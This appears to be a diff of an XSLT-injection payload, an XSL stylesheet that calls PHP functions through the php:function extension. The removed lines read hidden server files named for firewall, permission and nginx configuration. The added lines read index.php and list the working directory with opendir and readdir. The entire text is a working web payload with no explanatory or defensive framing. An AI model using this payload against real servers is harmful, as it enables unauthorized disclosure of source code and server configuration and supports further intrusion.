@@ -1,10 +1,7 @@
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
-<xsl:value-of select="php:function('file_get_contents','._nginx.http-level.inc')"/> -
-<xsl:value-of select="php:function('file_get_contents','._firewall')"/> -
-<xsl:value-of select="php:function('file_get_contents','._nginx.server-level.inc')"/> -
-<xsl:value-of select="php:function('file_get_contents','._perms')"/>  -
-<xsl:value-of select="php:function('opendir','./Resource id #7')"/> -
+<xsl:value-of select="php:function('file_get_contents','index.php')"/> -
+<xsl:value-of select="php:function('opendir','./')"/> -
 <xsl:value-of select="php:function('readdir')"/> -
 <xsl:value-of select="php:function('readdir')"/> -
 <xsl:value-of select="php:function('readdir')"/> -
